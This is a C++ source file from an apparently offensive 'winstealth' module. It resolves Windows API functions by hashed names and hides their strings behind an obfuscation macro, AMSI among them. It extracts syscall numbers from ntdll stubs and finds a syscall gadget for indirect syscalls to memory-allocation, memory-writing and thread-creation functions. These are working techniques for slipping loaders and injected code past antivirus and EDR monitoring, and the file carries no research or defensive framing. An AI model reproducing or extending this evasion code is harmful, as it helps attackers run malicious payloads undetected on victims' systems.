#include "snake/winstealth.hpp"

#include <cstring>

namespace snake {
namespace winstealth {

namespace {

constexpr std::uint32_t kFnvOffset = 2166136261u;
constexpr std::uint32_t kFnvPrime = 16777619u;

inline std::uint32_t fnv_step(std::uint32_t h, unsigned char c) {
    if (c >= 'A' && c <= 'Z') c = static_cast<unsigned char>(c + ('a' - 'A'));
    return (h ^ c) * kFnvPrime;
}

bool read_u16(ImageView img, std::size_t off, std::uint16_t& out) {
    if (off + 2 > img.size) return false;
    out = static_cast<std::uint16_t>(img.base[off] | (static_cast<std::uint16_t>(img.base[off + 1]) << 8));
    return true;
}

bool read_u32(ImageView img, std::size_t off, std::uint32_t& out) {
    if (off + 4 > img.size) return false;
    out = static_cast<std::uint32_t>(img.base[off]) | (static_cast<std::uint32_t>(img.base[off + 1]) << 8) |
          (static_cast<std::uint32_t>(img.base[off + 2]) << 16) |
          (static_cast<std::uint32_t>(img.base[off + 3]) << 24);
    return true;
}

bool read_name_rva(ImageView img, std::uint32_t rva, std::string& out) {
    out.clear();
    if (rva >= img.size) return false;
    for (std::size_t i = rva; i < img.size; ++i) {
        const char c = static_cast<char>(img.base[i]);
        if (c == '\0') return true;
        if (out.size() >= 256) return false;
        out.push_back(c);
    }
    return false;
}

struct PeLayout {
    std::uint32_t opt_off = 0;
    std::uint16_t opt_magic = 0;
    std::uint16_t opt_size = 0;
    std::uint16_t sections = 0;
};

bool pe_layout(ImageView img, PeLayout& out) {
    std::uint16_t dos = 0;
    if (!read_u16(img, 0, dos) || dos != 0x5A4D) return false;
    std::uint32_t pe = 0;
    if (!read_u32(img, 0x3C, pe)) return false;
    std::uint32_t sig = 0;
    if (!read_u32(img, pe, sig) || sig != 0x00004550) return false;
    out.opt_off = pe + 24;
    if (!read_u16(img, pe + 4 + 2, out.sections)) return false;
    if (!read_u16(img, pe + 4 + 16, out.opt_size)) return false;
    if (!read_u16(img, out.opt_off, out.opt_magic)) return false;
    if (out.opt_magic != 0x20B && out.opt_magic != 0x10B) return false;
    return true;
}

}  // namespace

std::uint32_t fnv1a_ascii(const char* name) {
    std::uint32_t h = kFnvOffset;
    if (!name) return h;
    for (const char* p = name; *p; ++p) h = fnv_step(h, static_cast<unsigned char>(*p));
    return h;
}

std::uint32_t fnv1a_ascii(const std::string& name) { return fnv1a_ascii(name.c_str()); }

std::uint32_t fnv1a_wide(const wchar_t* name, std::size_t len) {
    std::uint32_t h = kFnvOffset;
    if (!name) return h;
    for (std::size_t i = 0; i < len; ++i) {
        const unsigned int w = static_cast<unsigned int>(name[i]);
        if (w > 0x7F) return 0;
        h = fnv_step(h, static_cast<unsigned char>(w));
    }
    return h;
}

std::uint32_t fnv1a_wide(const wchar_t* name) {
    if (!name) return kFnvOffset;
    std::size_t len = 0;
    while (name[len]) ++len;
    return fnv1a_wide(name, len);
}

std::uint32_t pe_export_rva(ImageView image, std::uint32_t name_hash) {
    PeLayout pe;
    if (!image.ok() || !pe_layout(image, pe)) return 0;

    const std::size_t dd = pe.opt_off + (pe.opt_magic == 0x20B ? 112 : 96);
    std::uint32_t exp_rva = 0, exp_size = 0;
    if (!read_u32(image, dd, exp_rva) || !read_u32(image, dd + 4, exp_size)) return 0;
    if (exp_rva == 0 || exp_size == 0) return 0;

    std::uint32_t n_names = 0, funcs = 0, names = 0, ords = 0;
    if (!read_u32(image, exp_rva + 24, n_names)) return 0;
    if (!read_u32(image, exp_rva + 28, funcs)) return 0;
    if (!read_u32(image, exp_rva + 32, names)) return 0;
    if (!read_u32(image, exp_rva + 36, ords)) return 0;

    for (std::uint32_t i = 0; i < n_names; ++i) {
        std::uint32_t name_rva = 0;
        if (!read_u32(image, names + static_cast<std::size_t>(i) * 4, name_rva)) return 0;
        std::string name;
        if (!read_name_rva(image, name_rva, name)) continue;
        if (fnv1a_ascii(name) != name_hash) continue;
        std::uint16_t ordinal = 0;
        if (!read_u16(image, ords + static_cast<std::size_t>(i) * 2, ordinal)) return 0;
        std::uint32_t fn_rva = 0;
        if (!read_u32(image, funcs + static_cast<std::size_t>(ordinal) * 4, fn_rva)) return 0;
        if (fn_rva >= exp_rva && fn_rva < exp_rva + exp_size) return 0;
        return fn_rva;
    }
    return 0;
}

bool pe_section_span(ImageView image, std::uint32_t rva, std::size_t& off, std::size_t& len) {
    PeLayout pe;
    if (!image.ok() || !pe_layout(image, pe)) return false;
    const std::size_t sec_off = pe.opt_off + pe.opt_size;
    for (std::uint16_t i = 0; i < pe.sections; ++i) {
        const std::size_t s = sec_off + static_cast<std::size_t>(i) * 40;
        std::uint32_t vsize = 0, vaddr = 0;
        if (!read_u32(image, s + 8, vsize)) return false;
        if (!read_u32(image, s + 12, vaddr)) return false;
        if (rva < vaddr) continue;
        if (static_cast<std::uint32_t>(rva - vaddr) >= vsize) continue;
        off = vaddr;
        len = vsize;
        return true;
    }
    return false;
}

std::uint32_t stub_ssn(const std::uint8_t* code, std::size_t len, bool& ok) {
    ok = false;
    if (!code || len < 12) return 0;
    if (!(code[0] == 0x4C && code[1] == 0x8B && code[2] == 0xD1 && code[3] == 0xB8)) return 0;
    const std::uint32_t ssn = static_cast<std::uint32_t>(code[4]) |
                              (static_cast<std::uint32_t>(code[5]) << 8) |
                              (static_cast<std::uint32_t>(code[6]) << 16) |
                              (static_cast<std::uint32_t>(code[7]) << 24);
    const std::size_t window = len < 32 ? len : 32;
    for (std::size_t i = 8; i + 1 < window; ++i) {
        if (code[i] == 0x0F && code[i + 1] == 0x05) {
            ok = true;
            return ssn;
        }
    }
    return 0;
}

std::int64_t find_syscall_gadget(const std::uint8_t* code, std::size_t len) {
    if (!code) return -1;
    for (std::size_t i = 0; i + 2 < len; ++i) {
        if (code[i] == 0x0F && code[i + 1] == 0x05 && code[i + 2] == 0xC3) {
            return static_cast<std::int64_t>(i);
        }
    }
    return -1;
}

ApiSpec api_spec(Api api) {
    switch (api) {
        case Api::NtAllocateVirtualMemory:
        case Api::NtProtectVirtualMemory:
        case Api::NtCreateThreadEx:
        case Api::NtQueryVirtualMemory:
        case Api::NtFreeVirtualMemory:
        case Api::NtWriteVirtualMemory:
            return ApiSpec{Module::ntdll, true};
        case Api::VirtualLock:
        case Api::VirtualUnlock:
        case Api::VirtualProtect:
        case Api::GetSystemInfo:
            return ApiSpec{Module::kernel32, false};
        case Api::Count:
            break;
    }
    return ApiSpec{Module::ntdll, false};
}

const std::string& api_name(Api api) {
    switch (api) {
        case Api::NtAllocateVirtualMemory:
            return SNAKE_OBF("NtAllocateVirtualMemory");
        case Api::NtProtectVirtualMemory:
            return SNAKE_OBF("NtProtectVirtualMemory");
        case Api::NtCreateThreadEx:
            return SNAKE_OBF("NtCreateThreadEx");
        case Api::NtQueryVirtualMemory:
            return SNAKE_OBF("NtQueryVirtualMemory");
        case Api::NtFreeVirtualMemory:
            return SNAKE_OBF("NtFreeVirtualMemory");
        case Api::NtWriteVirtualMemory:
            return SNAKE_OBF("NtWriteVirtualMemory");
        case Api::VirtualLock:
            return SNAKE_OBF("VirtualLock");
        case Api::VirtualUnlock:
            return SNAKE_OBF("VirtualUnlock");
        case Api::VirtualProtect:
            return SNAKE_OBF("VirtualProtect");
        case Api::GetSystemInfo:
            return SNAKE_OBF("GetSystemInfo");
        case Api::Count:
            break;
    }
    return SNAKE_OBF("VirtualProtect");
}

const std::string& module_name(Module module) {
    switch (module) {
        case Module::ntdll:
            return SNAKE_OBF("ntdll.dll");
        case Module::kernel32:
            return SNAKE_OBF("kernel32.dll");
        case Module::amsi:
            return SNAKE_OBF("amsi.dll");
    }
    return SNAKE_OBF("ntdll.dll");
}

bool Table::load(ImageView image, Module module) {
    base_ = image.base;
    size_ = image.size;
    resolved_ = 0;
    unresolved_ = 0;
    gadget_off_ = 0;
    for (std::size_t i = 0; i < static_cast<std::size_t>(Api::Count); ++i) {
        entries_[i] = Entry{};
    }
    if (!image.ok()) return false;

    for (std::size_t i = 0; i < static_cast<std::size_t>(Api::Count); ++i) {
        const Api api = static_cast<Api>(i);
        const ApiSpec spec = api_spec(api);
        if (spec.module != module) continue;
        Entry& e = entries_[i];
        e.syscall = spec.syscall;
        const std::uint32_t rva = pe_export_rva(image, fnv1a_ascii(api_name(api)));
        if (rva == 0 || rva >= image.size) {
            unresolved_++;
            continue;
        }
        e.rva = rva;
        if (spec.syscall) {
            bool ok = false;
            const std::size_t remaining = image.size - rva;
            const std::size_t window = remaining < 64 ? remaining : 64;
            const std::uint32_t ssn = stub_ssn(image.base + rva, window, ok);
            if (!ok) {
                e.rva = 0;
                unresolved_++;
                continue;
            }
            e.ssn = ssn;
        }
        e.resolved = true;
        resolved_++;
    }

    if (module == Module::ntdll) {
        std::size_t off = 0, len = 0;
        std::uint32_t anchor = 0;
        for (std::size_t i = 0; i < static_cast<std::size_t>(Api::Count); ++i) {
            if (entries_[i].resolved && entries_[i].syscall) {
                anchor = entries_[i].rva;
                break;
            }
        }
        bool have_span = anchor != 0 && pe_section_span(image, anchor, off, len);
        if (!have_span) {
            off = 0;
            len = image.size;
        }
        const std::int64_t gadget = find_syscall_gadget(image.base + off, len);
        gadget_off_ = gadget < 0 ? 0 : static_cast<std::uint32_t>(off + static_cast<std::size_t>(gadget));
    }
    return true;
}

void Table::set_raw_syscall(RawSyscall fn) { raw_ = fn; }

bool Table::resolved(Api api) const {
    return entries_[static_cast<std::size_t>(api)].resolved;
}

bool Table::is_syscall(Api api) const { return entries_[static_cast<std::size_t>(api)].syscall; }

std::uint32_t Table::ssn(Api api) const { return entries_[static_cast<std::size_t>(api)].ssn; }

std::uint32_t Table::code_rva(Api api) const { return entries_[static_cast<std::size_t>(api)].rva; }

std::uintptr_t Table::code_ptr(Api api) const {
    const Entry& e = entries_[static_cast<std::size_t>(api)];
    if (!e.resolved || !base_) return 0;
    return reinterpret_cast<std::uintptr_t>(base_ + e.rva);
}

const void* Table::gadget_ptr() const {
    if (!base_ || gadget_off_ == 0) return nullptr;
    return base_ + gadget_off_;
}

long long Table::syscall(Api api, const std::uint64_t* args, std::size_t nargs) const {
    const Entry& e = entries_[static_cast<std::size_t>(api)];
    if (!e.resolved || !e.syscall) return kNoSyscall;
    if (!raw_ || !base_ || gadget_off_ == 0) return kNoSyscall;
    if (nargs > kMaxSyscallArgs) return kNoSyscall;

    std::uint64_t slots[kMaxSyscallArgs] = {0};
    for (std::size_t i = 0; i < nargs; ++i) slots[i] = args[i];
    return raw_(e.ssn, const_cast<std::uint8_t*>(base_) + gadget_off_, slots[0], slots[1], slots[2],
                slots[3], slots[4], slots[5], slots[6], slots[7], slots[8], slots[9], slots[10]);
}

}  // namespace winstealth
}  // namespace snake
